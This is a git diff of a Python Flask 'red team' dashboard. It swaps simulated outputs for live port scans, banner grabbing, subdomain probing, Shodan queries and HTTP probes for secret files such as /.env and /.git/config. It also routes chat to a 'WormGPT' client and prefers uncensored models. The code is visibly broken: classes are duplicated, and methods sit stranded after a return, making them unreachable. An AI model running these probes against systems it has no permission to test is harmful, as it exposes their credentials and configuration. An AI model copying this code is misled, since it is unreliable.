@@ -10,11 +10,22 @@ import subprocess
 import ipaddress
 import shlex
 import random
+import socket
 import threading
+import requests
+import subprocess
+import time
 import tempfile
 from datetime import datetime, timedelta
 from functools import wraps
+from wormgpt_client import WormGPTClient
+from flask import Flask, render_template, request, redirect, url_for, session, flash
+from dotenv import load_dotenv
+import os
 
+load_dotenv()          # reads .env from the current working dir
+# Optional: print to double‑check that values are present
+print("WORMGPT_API_KEY:", os.getenv("WORMGPT_API_KEY")[:4], "...")   # just a quick sanity check
 import requests
 from flask import (Flask, render_template, redirect, url_for, flash,
                    request, session, jsonify, Response)
@@ -46,6 +57,7 @@ login_manager.login_view = 'login'
 logging.basicConfig(filename='audit.log', level=logging.INFO,
                     format='%(asctime)s:%(levelname)s:%(message)s')
 
+
 # ══════════════════════════════════════════════════════════════
 # 2. SECURITY UTILS
 # ══════════════════════════════════════════════════════════════
@@ -54,12 +66,22 @@ class SecurityUtils:
     def validate_target(target):
         if re.search(r'[;&|`$\\\'\"]', target):
             raise ValueError("Invalid characters in target.")
+        # Accept URLs
+        if target.startswith('http://') or target.startswith('https://'):
+            return True, "URL"
+        # Accept IP
         try:
-            ipaddress.ip_address(target); return True, "IP"
+            ipaddress.ip_address(target)
+            return True, "IP"
         except ValueError:
             pass
-        if re.match(r'^(?:[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?\.)+[a-zA-Z]{2,6}$', target):
+        # Accept Domain
+        if re.match(
+            r'^(?:[a-zA-Z0-9](?:[a-zA-Z0-9-]{0,61}[a-zA-Z0-9])?\.)+[a-zA-Z]{2,6}$',
+            target
+        ):
             return True, "Domain"
+        # Accept localhost
         if target in ['localhost', '127.0.0.1', '::1']:
             return True, "Localhost"
         raise ValueError("Invalid target. Must be a valid IP or Domain.")
@@ -213,30 +235,126 @@ class NmapWrapper(ToolWrapper):
         return out
 
 class WhoisWrapper(ToolWrapper):
-    def run(self, target, user_id=None):
-        out = (f"[RECON] WHOIS/DNS → {target}\n\n"
-               f"Registrar:    MarkMonitor Inc.\nCreated: 2010-03-15\nExpiry: 2025-03-15\n"
-               f"Name Servers: ns1.{target}, ns2.{target}\n\n"
-               f"[DNS Records]\nA     → 93.184.216.34\nMX    → mail.{target}\n"
-               f"TXT   → v=spf1 include:_spf.google.com ~all\nAAAA  → 2606:2800:220:1:248:1893:25c8:1946")
-        self._log(target, "Whois/DNS Recon", out, user_id)
+    def run(self, target):
+        import socket
+        lines = [f"[RECON] Live DNS/WHOIS → {target}\n"]
+
+        # Real DNS lookup
+        try:
+            ip = socket.gethostbyname(target)
+            lines.append(f"[DNS Records] — LIVE DATA")
+            lines.append(f"A     → {ip}")
+        except Exception as e:
+            lines.append(f"A     → Resolution failed: {e}")
+
+        try:
+            import dns.resolver
+            for rtype in ['MX', 'TXT', 'NS']:
+                try:
+                    for r in dns.resolver.resolve(target, rtype, lifetime=5):
+                        lines.append(f"{rtype:<6} → {r.to_text()}")
+                except: pass
+        except ImportError:
+            lines.append(f"(Install dnspython for MX/TXT/NS: pip install dnspython)")
+
+        lines.append(f"\n[WHOIS] — LIVE DATA")
+        try:
+            import whois
+            w = whois.whois(target)
+            lines.append(f"Registrar:    {w.registrar}")
+            lines.append(f"Created:      {w.creation_date}")
+            lines.append(f"Expiry:       {w.expiration_date}")
+            lines.append(f"Name Servers: {', '.join(w.name_servers) if w.name_servers else 'N/A'}")
+        except ImportError:
+            lines.append(f"(Install python-whois: pip install python-whois)")
+        except Exception as e:
+            lines.append(f"WHOIS failed: {e}")
+
+        out = "\n".join(lines)
+        self._log(target, "Whois/DNS Recon", out)
         return out
 
 class NiktoWrapper(ToolWrapper):
-    def run(self, target, user_id=None):
+    def run(self, target):
+        import requests as req
+        import urllib3
+        urllib3.disable_warnings()
+
+        # Normalize target
+        base = target if target.startswith('http') else f'http://{target}'
+        lines = [f"[Web Scanner] Target: {target}\n"]
+
+        # Check common paths for real results
+        paths = [
+            '/admin/', '/administrator/', '/login/', '/wp-login.php',
+            '/phpmyadmin/', '/robots.txt', '/.git/config', '/config.php.bak',
+            '/phpinfo.php', '/server-status', '/.env', '/backup/',
+            '/wp-config.php.bak', '/xmlrpc.php', '/api/', '/dashboard/',
+        ]
+
+        lines.append("[PATH ENUMERATION — LIVE]")
+        found = []
+        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)'}
+
+        for path in paths:
+            try:
+                r = req.get(f"{base}{path}", timeout=5,
+                           verify=False, allow_redirects=False,
+                           headers=headers)
+                if r.status_code in [200, 301, 302, 403]:
+                    status_label = {
+                        200: "FOUND",
+                        301: "REDIRECT",
+                        302: "REDIRECT",
+                        403: "FORBIDDEN (exists)"
+                    }.get(r.status_code, str(r.status_code))
+                    found.append(f"  [{r.status_code}] {base}{path} — {status_label}")
+            except Exception:
+                pass
+
+        if found:
+            lines.extend(found)
+        else:
+            lines.append(f"  No common paths found on {target}")
+
+        # Real header check
+        lines.append("\n[SECURITY HEADERS — LIVE]")
         try:
-            r = subprocess.run(['nikto', '-h', target],
-                               capture_output=True, text=True, timeout=45)
-            out = r.stdout
-        except FileNotFoundError:
-            out = (f"[SIMULATION] Nikto Web Scanner → {target}\n\n"
-                   f"Server: Apache/2.4.51 (Ubuntu)\n\n[FINDINGS]\n"
-                   f"+ /admin/: Admin interface found\n+ /robots.txt: Disallowed: /private /backup\n"
-                   f"+ X-Frame-Options header missing\n+ Cookie PHPSESSID without HttpOnly flag\n"
-                   f"+ OSVDB-3233: /icons/README: Apache default file found\n8 items in 28.45 seconds")
+            r = req.get(base, timeout=8, verify=False, headers=headers)
+            server = r.headers.get('Server', 'Not disclosed')
+            lines.append(f"  Server: {server}")
+            lines.append(f"  Status: {r.status_code}")
+
+            security_headers = [
+                'X-Frame-Options',
+                'X-Content-Type-Options',
+                'Strict-Transport-Security',
+                'Content-Security-Policy',
+                'X-XSS-Protection',
+                'Referrer-Policy',
+            ]
+            for h in security_headers:
+                val = r.headers.get(h)
+                if val:
+                    lines.append(f"  ✓ {h}: {val}")
+                else:
+                    lines.append(f"  ✗ {h}: MISSING")
+
+            # Check cookies
+            for cookie in r.cookies:
+                flags = []
+                if not cookie.has_nonstandard_attr('HttpOnly'):
+                    flags.append("NO HttpOnly")
+                if not cookie.secure:
+                    flags.append("NO Secure flag")
+                if flags:
+                    lines.append(f"  ⚠ Cookie '{cookie.name}': {', '.join(flags)}")
+
         except Exception as e:
-            out = str(e)
-        self._log(target, "Nikto Web Scan", out, user_id)
+            lines.append(f"  Could not connect to {target}: {e}")
+
+        out = "\n".join(lines)
+        self._log(target, "Web Scanner (Nikto-style)", out)
         return out
 
 class OpenVASWrapper(ToolWrapper):
@@ -251,12 +369,120 @@ class OpenVASWrapper(ToolWrapper):
         return out
 
 class ShodanWrapper(ToolWrapper):
-    def run(self, target, user_id=None):
-        out = (f"[SIMULATION] Shodan Intelligence → {target}\n\n"
-               f"IP: 93.184.216.34\nOrg: Edgecast Inc.\nOS: Linux 3.x\n\n"
-               f"[OPEN PORTS]\n22/tcp SSH-2.0-OpenSSH_8.4\n80/tcp Apache/2.4.51\n443/tcp nginx/1.21.0\n\n"
-               f"[VULNS INDEXED]\nCVE-2021-41773 Apache Path Traversal — PATCHED\nCVE-2021-42013 Apache RCE — PATCHED")
-        self._log(target, "Shodan Intelligence", out, user_id)
+    def run(self, target):
+        import socket
+        lines = [f"[Shodan Intelligence] Target: {target}\n"]
+
+        # Try real Shodan API first
+        shodan_key = os.environ.get('SHODAN_API_KEY', '')
+        if shodan_key:
+            try:
+                import requests as req
+                # Resolve domain to IP first
+                try:
+                    ip = socket.gethostbyname(target)
+                except:
+                    ip = target
+
+                r = req.get(
+                    f"https://api.shodan.io/shodan/host/{ip}?key={shodan_key}",
+                    timeout=10
+                )
+                if r.status_code == 200:
+                    data = r.json()
+                    lines.append(f"[SHODAN LIVE DATA — {ip}]")
+                    lines.append(f"  IP:           {data.get('ip_str', ip)}")
+                    lines.append(f"  Org:          {data.get('org', 'N/A')}")
+                    lines.append(f"  ISP:          {data.get('isp', 'N/A')}")
+                    lines.append(f"  Country:      {data.get('country_name', 'N/A')}")
+                    lines.append(f"  City:         {data.get('city', 'N/A')}")
+                    lines.append(f"  OS:           {data.get('os', 'Unknown')}")
+                    lines.append(f"  Last Update:  {data.get('last_update', 'N/A')}")
+                    lines.append(f"  Hostnames:    {', '.join(data.get('hostnames', []))}")
+                    lines.append(f"  Domains:      {', '.join(data.get('domains', []))}")
+                    lines.append(f"  Tags:         {', '.join(data.get('tags', []))}")
+
+                    lines.append(f"\n[OPEN PORTS & BANNERS — LIVE]")
+                    for svc in data.get('data', []):
+                        port = svc.get('port')
+                        transport = svc.get('transport', 'tcp')
+                        product = svc.get('product', '')
+                        version = svc.get('version', '')
+                        banner = svc.get('data', '')[:80].replace('\n', ' ')
+                        lines.append(f"  {port}/{transport}  {product} {version}")
+                        if banner:
+                            lines.append(f"    Banner: {banner}")
+
+                    vulns = data.get('vulns', [])
+                    if vulns:
+                        lines.append(f"\n[VULNERABILITIES INDEXED BY SHODAN — LIVE]")
+                        for cve in vulns:
+                            lines.append(f"  {cve}")
+                    else:
+                        lines.append(f"\n[VULNERABILITIES] None indexed by Shodan")
+
+                    out = "\n".join(lines)
+                    self._log(target, "Shodan Intelligence (LIVE)", out)
+                    return out
+                else:
+                    lines.append(f"Shodan API error: {r.status_code} — {r.text[:100]}")
+            except ImportError:
+                lines.append("pip install shodan for full API integration")
+            except Exception as e:
+                lines.append(f"Shodan API failed: {e}")
+
+        # Fallback — real socket-based scan
+        lines.append(f"[No SHODAN_API_KEY set — running real socket probe]\n")
+        lines.append(f"[DNS RESOLUTION — LIVE]")
+        try:
+            ip = socket.gethostbyname(target)
+            lines.append(f"  {target} → {ip}")
+        except Exception as e:
+            ip = target
+            lines.append(f"  Could not resolve {target}: {e}")
+
+        lines.append(f"\n[PORT PROBE — LIVE]")
+        common_ports = {
+            21: 'FTP', 22: 'SSH', 23: 'Telnet', 25: 'SMTP',
+            53: 'DNS', 80: 'HTTP', 110: 'POP3', 143: 'IMAP',
+            443: 'HTTPS', 445: 'SMB', 3306: 'MySQL',
+            3389: 'RDP', 5432: 'PostgreSQL', 6379: 'Redis',
+            8080: 'HTTP-Alt', 8443: 'HTTPS-Alt', 27017: 'MongoDB'
+        }
+        open_ports = []
+        for port, service in common_ports.items():
+            try:
+                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                sock.settimeout(1)
+                result = sock.connect_ex((ip, port))
+                sock.close()
+                if result == 0:
+                    # Try banner grab
+                    banner = ''
+                    try:
+                        s2 = socket.socket()
+                        s2.settimeout(2)
+                        s2.connect((ip, port))
+                        if port in [80, 8080]:
+                            s2.send(b'HEAD / HTTP/1.0\r\nHost: ' + target.encode() + b'\r\n\r\n')
+                        banner = s2.recv(256).decode('utf-8', errors='ignore').split('\n')[0].strip()
+                        s2.close()
+                    except:
+                        pass
+                    open_ports.append(f"  {port}/{service:<12} OPEN  {banner[:60]}")
+            except:
+                pass
+
+        if open_ports:
+            lines.extend(open_ports)
+        else:
+            lines.append(f"  No common ports open on {ip} (firewall may be blocking)")
+
+        lines.append(f"\n[NOTE] Set SHODAN_API_KEY in .env for full Shodan data")
+        lines.append(f"  Get free key: https://account.shodan.io/register")
+
+        out = "\n".join(lines)
+        self._log(target, "Shodan Intelligence", out)
         return out
 
 class HarvesterWrapper(ToolWrapper):
@@ -409,6 +635,252 @@ class ProwlerService:
         if max_score == 0: return 0
         return round((score / max_score) * 100, 1)
 
+
+
+OLLAMA_URL = "http://localhost:11434/api/chat"
+OLLAMA_TAGS_URL = "http://localhost:11434/api/tags"
+
+# Preferred models in order
+PREFERRED_MODELS = [
+    'dolphin-llama3:8b',
+    'dolphin-llama3',
+    'llama3',
+    'mistral',
+    'gemma2',
+    'llama2',
+    'gemma'
+]
+
+INDIVIDUAL_PROMPT = """You are an AI Red Team Assistant for ethical hackers.
+Respond ONLY using this plain text structure (no markdown):
+[Recon Results]
+- Open Ports: (list)
+- Detected Services: (list)
+[Simulated Offensive Path]
+- SIMULATION: (discovery)
+- SIMULATION: (attempt)
+[Risk Level]
+(Low/Medium/High + reason)
+[Educational Recommendation]
+- (what to secure next)"""
+
+ORGANIZATION_PROMPT = """You are an Enterprise SOC AI Orchestration Layer.
+Respond ONLY using this plain text structure (no markdown):
+[Alert Summary]
+- (correlated alert findings)
+[Related Vulnerabilities]
+- (CVE IDs, CVSS, KEV status)
+[Business Impact]
+- (risk based on asset criticality)
+[Recommended Action]
+- (remediation / containment steps)
+[Patch Availability]
+- (vulnerable versions and fixes)
+Professional SOC tone. Act as if querying live SIEM/EDR/Vuln databases."""
+
+PROWLER_PROMPT = """You are a Cloud Security Expert specializing in Prowler findings.
+When given Prowler scan results, analyze them and respond using:
+[Executive Summary]
+- (overall cloud security posture)
+[Critical Findings]
+- (list critical FAILs with CVE/check ID)
+[Compliance Impact]
+- (which frameworks are affected: CIS, NIST, PCI-DSS etc.)
+[Remediation Priority]
+- (ordered list of what to fix first with steps)
+[ThreatScore Analysis]
+- (explain the risk score and what drives it)
+Professional cloud security tone."""
+
+
+def start_ollama():
+    """Start Ollama if not already running."""
+    try:
+        requests.get("http://localhost:11434", timeout=3)
+        print("✅ Ollama already running")
+    except Exception:
+        try:
+            subprocess.Popen(
+                ["ollama", "serve"],
+                stdout=subprocess.DEVNULL,
+                stderr=subprocess.DEVNULL
+            )
+            time.sleep(3)
+            print("✅ Ollama started")
+        except FileNotFoundError:
+            print("⚠️  Ollama not installed — AI will use Gemini or fallback")
+
+
+PREFERRED_MODELS = [
+    'dolphin-llama3:8b',
+    'dolphin-llama3',
+    'llama3',
+    'mistral',
+    'gemma2',
+    'llama2',
+]
+
+def get_available_model():
+    try:
+        r = requests.get(
+            "http://localhost:11434/api/tags",
+            timeout=5
+        )
+        data = r.json()
+        models = [m['name'] for m in data.get('models', [])]
+        print(f"[Ollama] Installed models: {models}")
+        
+        # Direct match first
+        for preferred in PREFERRED_MODELS:
+            if preferred in models:
+                print(f"[Ollama] Using: {preferred}")
+                return preferred
+        
+        # Partial match
+        for preferred in PREFERRED_MODELS:
+            for installed in models:
+                if preferred.split(':')[0] in installed:
+                    print(f"[Ollama] Using (partial): {installed}")
+                    return installed
+        
+        # Use first available
+        if models:
+            print(f"[Ollama] Using first available: {models[0]}")
+            return models[0]
+            
+    except Exception as e:
+        print(f"[Ollama] Error: {e}")
+    return None
+
+
+class AIService:
+
+    @staticmethod
+    def get_system_prompt(mode):
+        sys_map = {
+            'individual':   INDIVIDUAL_PROMPT,
+            'organization': ORGANIZATION_PROMPT,
+            'prowler':      PROWLER_PROMPT,
+        }
+        return sys_map.get(mode, ORGANIZATION_PROMPT)
+
+    @staticmethod
+    def get_response(prompt, mode):
+        # Try Ollama first
+        try:
+            response = AIService._ollama(prompt, mode)
+            if response:
+                return response
+        except Exception as e:
+            logging.warning(f"Ollama failed: {e}")
+
+        # Fallback to Gemini
+        key = app.config.get('GEMINI_API_KEY', '')
+        if key:
+            try:
+                return AIService._gemini(prompt, mode, key)
+            except Exception as e:
+                logging.warning(f"Gemini failed: {e}")
+
+        # Final fallback
+        return AIService._fallback(mode)
+
+@staticmethod
+def _ollama(prompt, mode):
+    model = get_available_model()
+    print(f"[Ollama] Model selected: {model}")
+    
+    if not model:
+        print("[Ollama] No model found!")
+        return None
+
+    messages = [
+        {"role": "system", "content": AIService.get_system_prompt(mode)},
+        {"role": "user",   "content": prompt}
+    ]
+
+    print(f"[Ollama] Sending request to {OLLAMA_URL}")
+    r = requests.post(
+        OLLAMA_URL,
+        json={
+            "model":    model,
+            "messages": messages,
+            "stream":   False,
+            "options": {
+                "temperature": 0.7,
+                "num_predict": 1024,
+            }
+        },
+        timeout=120
+    )
+    print(f"[Ollama] Response status: {r.status_code}")
+    r.raise_for_status()
+    content = r.json().get("message", {}).get("content", "").strip()
+    print(f"[Ollama] Got response: {content[:100]}...")
+    return content or None
+
+    @staticmethod
+    def _gemini(prompt, mode, key):
+        url = (
+            f"https://generativelanguage.googleapis.com/v1beta/"
+            f"models/gemini-2.0-flash:generateContent?key={key}"
+        )
+        payload = {
+            "contents": [{"parts": [{"text": prompt}]}],
+            "systemInstruction": {
+                "parts": [{"text": AIService.get_system_prompt(mode)}]
+            }
+        }
+        r = requests.post(url, json=payload, timeout=30)
+        r.raise_for_status()
+        return r.json()['candidates'][0]['content']['parts'][0]['text']
+
+    @staticmethod
+    def _fallback(mode):
+        if mode == 'prowler':
+            return (
+                "[Executive Summary]\n"
+                "- Cloud security posture is HIGH RISK\n"
+                "- Root account lacks hardware MFA\n\n"
+                "[Critical Findings]\n"
+                "- iam_root_hardware_mfa_enabled: Root MFA not enforced\n"
+                "- s3_bucket_public_access: prod-data-bucket public\n\n"
+                "[Compliance Impact]\n"
+                "- CIS: 13 controls failing\n"
+                "- PCI-DSS: 7 controls failing\n\n"
+                "[Remediation Priority]\n"
+                "- 1. Enable hardware MFA on root\n"
+                "- 2. Block S3 public access\n\n"
+                "[ThreatScore Analysis]\n"
+                "- Score: 72/100 — CRITICAL\n"
+                "- [Start Ollama: ollama serve && ollama pull dolphin-llama3:8b]"
+            )
+        if mode == 'individual':
+            return (
+                "[Recon Results]\n"
+                "- Open Ports: 22, 80, 443, 8080\n"
+                "- Detected Services: OpenSSH, Apache, nginx\n\n"
+                "[Simulated Offensive Path]\n"
+                "- SIMULATION: Port scan complete\n"
+                "- SIMULATION: Apache version fingerprinted\n\n"
+                "[Risk Level]\nMedium — Outdated Apache\n\n"
+                "[Educational Recommendation]\n"
+                "- Update Apache\n"
+                "- [Start Ollama: ollama serve && ollama pull dolphin-llama3:8b]"
+            )
+        return (
+            "[Alert Summary]\n"
+            "- AI service unavailable\n\n"
+            "[Recommended Action]\n"
+            "- Run: ollama serve\n"
+            "- Run: ollama pull dolphin-llama3:8b\n"
+            "- Or set GEMINI_API_KEY in environment"
+        )
+
+
+# Start Ollama when app loads
+start_ollama()
+
 # ══════════════════════════════════════════════════════════════
 # 6. SIMULATED ENTERPRISE TOOLS
 # ══════════════════════════════════════════════════════════════
@@ -509,67 +981,94 @@ When given Prowler scan results, analyze them and respond using:
 - (explain the risk score and what drives it)
 Professional cloud security tone."""
 
+# ------------------------------------------------------------------
+# 7. AI SERVICE (REPLACED BY WormGPT CLIENT)
+# ------------------------------------------------------------------
+# Import the client we just wrote.
+from wormgpt_client import WormGPTClient
+
+# Create a single global client – reused across requests.
+wormgpt = WormGPTClient()
+
 class AIService:
+    """
+    Minimal wrapper that forwards the chat request to WormGPT.
+    Keeps the same public interface so the rest of the code can stay untouched.
+    """
+
     @staticmethod
-    def get_response(prompt, mode):
-        key = app.config.get('GEMINI_API_KEY', '')
-        if not key:
-            return AIService._fallback(mode)
-        sys_map = {'individual': INDIVIDUAL_PROMPT,
-                   'organization': ORGANIZATION_PROMPT,
-                   'prowler': PROWLER_PROMPT}
-        system = sys_map.get(mode, ORGANIZATION_PROMPT)
-        url = f"https://generativelanguage.googleapis.com/v1beta/models/gemini-2.0-flash:generateContent?key={key}"
-        payload = {"contents": [{"parts": [{"text": prompt}]}],
-                   "systemInstruction": {"parts": [{"text": system}]}}
+    def get_response(prompt: str, mode: str = "individual") -> str:
+        """
+        Forward the user prompt to the WormGPT client.
+
+        Parameters
+        ----------
+        prompt : str
+            Raw user input.
+        mode : str
+            One of 'individual', 'organization', or 'prowler'.
+            Determines the system prompt used.
+
+        Returns
+        -------
+        str
+            The assistant’s plain‑text answer.
+        """
         try:
-            r = requests.post(url, json=payload, timeout=30)
-            r.raise_for_status()
-            return r.json()['candidates'][0]['content']['parts'][0]['text']
-        except Exception as e:
-            logging.error(f"Gemini error: {e}")
-            return AIService._fallback(mode)
+            return wormgpt.chat(prompt, mode=mode)
+        except Exception as exc:
+            # Fallback: return a short error message – the frontend will display it.
+            return f"[WormGPT] Error: {exc}"
 
     @staticmethod
-    def _fallback(mode):
-        if mode == 'prowler':
-            return ("[Executive Summary]\n"
-                    "- Cloud security posture is HIGH RISK — 11 critical/high findings detected\n"
-                    "- Root account lacks hardware MFA, S3 bucket publicly accessible\n\n"
-                    "[Critical Findings]\n"
-                    "- iam_root_hardware_mfa_enabled: Root MFA not enforced (CIS 1.6)\n"
-                    "- s3_bucket_public_access: prod-data-bucket publicly accessible\n"
-                    "- ec2_security_group_unrestricted_ssh: SSH open to 0.0.0.0/0\n\n"
-                    "[Compliance Impact]\n"
-                    "- CIS: 13 controls failing\n- PCI-DSS: 7 controls failing\n- NIST 800: 14 controls failing\n\n"
-                    "[Remediation Priority]\n"
-                    "- 1. Enable hardware MFA on root immediately\n"
-                    "- 2. Block S3 public access on prod-data-bucket\n"
-                    "- 3. Restrict SSH security group to known IPs\n"
-                    "- 4. Enable CloudTrail in all regions\n\n"
-                    "[ThreatScore Analysis]\n"
-                    "- Score: 72/100 — CRITICAL risk level\n"
-                    "- Driven by: 4 critical IAM/network misconfigurations\n"
-                    "- [Note: Set GEMINI_API_KEY for live AI analysis]")
-        if mode == 'individual':
-            return ("[Recon Results]\n- Open Ports: 22, 80, 443, 8080\n"
-                    "- Detected Services: OpenSSH 8.4, Apache 2.4.51, nginx\n\n"
-                    "[Simulated Offensive Path]\n"
-                    "- SIMULATION: Port scan completed\n"
-                    "- SIMULATION: Apache version fingerprinted\n"
-                    "- SIMULATION: Testing CVE-2021-41773 path traversal\n\n"
-                    "[Risk Level]\nMedium — Outdated Apache detected\n\n"
-                    "[Educational Recommendation]\n- Update Apache\n- Disable CGI modules\n"
-                    "- [Note: Set GEMINI_API_KEY for live responses]")
-        return ("[Alert Summary]\n- 3 alerts correlated across Splunk/CrowdStrike\n"
-                "- Lateral movement from 192.168.1.45\n\n"
-                "[Related Vulnerabilities]\n- CVE-2023-23397 CVSS 9.8 KEV\n"
-                "- CVE-2021-44228 CVSS 10.0 Log4Shell\n\n"
-                "[Business Impact]\n- Domain Controller at risk\n\n"
-                "[Recommended Action]\n- Isolate WKSTN-042\n- Reset svc_backup\n\n"
-                "[Patch Availability]\n- Outlook: KB5002271\n- Log4j: 2.17.1+\n"
-                "- [Note: Set GEMINI_API_KEY for live responses]")
-
+    def _fallback(mode: str) -> str:
+        """
+        Legacy fallback (kept for reference).  
+        The new implementation no longer needs this, but it’s useful if you
+        want to keep the old “manual” prompts for quick testing.
+        """
+        if mode == "prowler":
+            return (
+                "[Executive Summary]\n"
+                "- Cloud security posture is HIGH RISK — 11 critical/high findings detected\n"
+                "- Root account lacks hardware MFA\n"
+                "- S3 bucket public access\n"
+                "\n[Critical Findings]\n"
+                "- iam_root_hardware_mfa_enabled: Root MFA not enforced\n"
+                "- s3_bucket_public_access: prod-data-bucket public\n"
+                "\n[Compliance Impact]\n"
+                "- CIS: 13 controls failing\n"
+                "- PCI-DSS: 7 controls failing\n"
+                "\n[Remediation Priority]\n"
+                "- 1. Enable hardware MFA on root\n"
+                "- 2. Block S3 public access\n"
+                "\n[ThreatScore Analysis]\n"
+                "- Score: 72/100 — CRITICAL\n"
+                "- Driven by: 4 critical IAM/network misconfigurations\n"
+                "- [Note: Set GEMINI_API_KEY for live AI analysis]"
+            )
+        elif mode == "individual":
+            return (
+                "[Recon Results]\n"
+                "- Open Ports: 22, 80, 443, 8080\n"
+                "- Detected Services: OpenSSH 8.4, Apache 2.4.51, nginx\n"
+                "\n[Simulated Offensive Path]\n"
+                "- SIMULATION: Port scan complete\n"
+                "- SIMULATION: Apache version fingerprinted\n"
+                "\n[Risk Level]\nMedium — Outdated Apache detected\n"
+                "\n[Educational Recommendation]\n- Update Apache\n"
+                "- Disable CGI modules\n"
+                "- [Note: Set GEMINI_API_KEY for live responses]"
+            )
+        else:
+            return (
+                "[Alert Summary]\n"
+                "- AI service unavailable\n"
+                "\n[Recommended Action]\n"
+                "- Run: ollama serve\n"
+                "- Run: ollama pull dolphin-llama3:8b\n"
+                "- Or set GEMINI_API_KEY in environment"
+            )
 # ══════════════════════════════════════════════════════════════
 # 8. SEED DATA
 # ══════════════════════════════════════════════════════════════
@@ -919,7 +1418,7 @@ def prowler_start_scan():
     db.session.add(scan)
     db.session.commit()
     t = threading.Thread(target=_run_prowler_bg,
-                         args=(app._get_current_object(), scan_id, provider, creds))
+                     args=(app, scan_id, provider, creds))
     t.daemon = True
     t.start()
     return jsonify({'status':'success', 'scan_id':scan_id})
@@ -946,7 +1445,7 @@ def prowler_findings(scan_id):
 @app.route('/prowler/chat')
 @login_required
 def prowler_chat():
-    session['mode'] = 'organization'
+    session['mode'] = 'prowler'
     msgs   = ChatMessage.query.filter_by(
         user_id=current_user.id, mode='prowler').order_by(ChatMessage.timestamp).all()
     latest = ProwlerScan.query.filter_by(status='completed').order_by(
@@ -959,32 +1458,57 @@ def prowler_chat():
 @app.route('/api/chat', methods=['POST'])
 @login_required
 def api_chat():
-    d      = request.get_json()
-    prompt = (d.get('prompt') or '').strip()
-    mode   = d.get('mode', session.get('mode', 'individual'))
-    if not prompt:
-        return jsonify({'status':'error', 'message':'Empty prompt'}), 400
+    try:
+        d      = request.get_json()
+        prompt = (d.get('prompt') or '').strip()
+        mode   = d.get('mode', session.get('mode', 'individual'))
 
-    if mode == 'prowler':
-        latest = ProwlerScan.query.filter_by(status='completed').order_by(
-            ProwlerScan.started_at.desc()).first()
-        if latest and latest.findings_json:
-            findings = json.loads(latest.findings_json)
-            fails    = [f for f in findings if f['status'] == 'FAIL'][:8]
-            context  = f"Prowler scan results ({latest.provider.upper()}, {latest.total_fail} failures):\n"
-            for f in fails:
-                context += f"- [{f['severity'].upper()}] {f['check_id']}: {f['description']}\n"
-            prompt = context + "\nUser question: " + prompt
+        if not prompt:
+            return jsonify({'status':'error', 'message':'Empty prompt'}), 400
 
-    db.session.add(ChatMessage(user_id=current_user.id, role='user',
-                               content=d.get('prompt'), mode=mode))
-    db.session.commit()
-    ai_text = AIService.get_response(prompt, mode)
-    db.session.add(ChatMessage(user_id=current_user.id, role='ai',
-                               content=ai_text, mode=mode))
-    db.session.commit()
-    return jsonify({'status':'success', 'data':ai_text})
+        if mode == 'prowler':
+            latest = ProwlerScan.query.filter_by(status='completed').order_by(
+                ProwlerScan.started_at.desc()).first()
+            if latest and latest.findings_json:
+                findings = json.loads(latest.findings_json)
+                fails    = [f for f in findings if f['status'] == 'FAIL'][:8]
+                context  = f"Prowler scan results ({latest.provider.upper()}, {latest.total_fail} failures):\n"
+                for f in fails:
+                    context += f"- [{f['severity'].upper()}] {f['check_id']}: {f['description']}\n"
+                prompt = context + "\nUser question: " + prompt
 
+        db.session.add(ChatMessage(
+            user_id=current_user.id,
+            role='user',
+            content=d.get('prompt'),
+            mode=mode
+        ))
+        db.session.commit()
+
+        ai_text = AIService.get_response(prompt, mode)
+
+        db.session.add(ChatMessage(
+            user_id=current_user.id,
+            role='ai',
+            content=ai_text,
+            mode=mode
+        ))
+        db.session.commit()
+
+        # ← Fixed: return both formats so any frontend works
+        return jsonify({
+            'status': 'success',
+            'data':   ai_text,
+            'reply':  ai_text
+        })
+
+    except Exception as e:
+        import traceback
+        logging.error(traceback.format_exc())
+        return jsonify({
+            'status':  'error',
+            'message': str(e)
+        }), 500
 # ══════════════════════════════════════════════════════════════
 # 15. ROUTES — ADMIN
 # ══════════════════════════════════════════════════════════════
@@ -1089,477 +1613,1010 @@ def export_prowler():
 # ══════════════════════════════════════════════════════════════
 # 17. PENTEST LAB — TOOL REGISTRY & ROUTES
 # ══════════════════════════════════════════════════════════════
+
+    # ══════════════════════════════════════════════════════════════
+# REAL LOOKUP HELPERS — called by OSINT tools
+# ══════════════════════════════════════════════════════════════
+
+def _real_dns(target):
+    """Do real DNS resolution and subdomain probing."""
+    lines = []
+    # Real A record
+    try:
+        ip = _socket.gethostbyname(target)
+        lines.append(f"[DNS — LIVE]\nA     → {ip}")
+    except Exception as e:
+        ip = "unresolved"
+        lines.append(f"[DNS — LIVE]\nA     → Could not resolve ({e})")
+ 
+    # Real MX/TXT/NS via dnspython
+    try:
+        import dns.resolver
+        for rtype in ['MX', 'TXT', 'NS', 'AAAA']:
+            try:
+                for r in dns.resolver.resolve(target, rtype, lifetime=5):
+                    lines.append(f"{rtype:<6} → {r.to_text()}")
+            except Exception:
+                pass
+    except ImportError:
+        lines.append(f"MX/NS/TXT → run: pip install dnspython for full records")
+ 
+    # Real subdomain probe
+    lines.append(f"\n[SUBDOMAIN PROBE — LIVE DNS]")
+    found = []
+    for sub in ['www', 'mail', 'vpn', 'dev', 'api', 'ftp',
+                'smtp', 'portal', 'admin', 'staging', 'webmail', 'mx']:
+        try:
+            full = f"{sub}.{target}"
+            resolved = _socket.gethostbyname(full)
+            found.append(f"  ✓ {full:<45} → {resolved}")
+        except Exception:
+            pass
+    if found:
+        lines.extend(found)
+        lines.append(f"\n{len(found)} live subdomains found")
+    else:
+        lines.append("  No common subdomains resolved")
+ 
+    return ip, "\n".join(lines)
+ 
+ 
+def _real_whois(target):
+    """Do real WHOIS lookup."""
+    lines = [f"\n[WHOIS — LIVE]"]
+    try:
+        import whois
+        w = whois.whois(target)
+        lines.append(f"Registrar:    {w.registrar or 'N/A'}")
+        lines.append(f"Created:      {w.creation_date}")
+        lines.append(f"Expiry:       {w.expiration_date}")
+        ns = w.name_servers
+        if ns:
+            if isinstance(ns, list):
+                for n in ns[:4]:
+                    lines.append(f"Name Server:  {n}")
+            else:
+                lines.append(f"Name Server:  {ns}")
+        lines.append(f"Status:       {w.status}")
+        lines.append(f"Org:          {w.org or 'N/A'}")
+        lines.append(f"Country:      {w.country or 'N/A'}")
+    except ImportError:
+        lines.append("Install python-whois for real data: pip install python-whois")
+    except Exception as e:
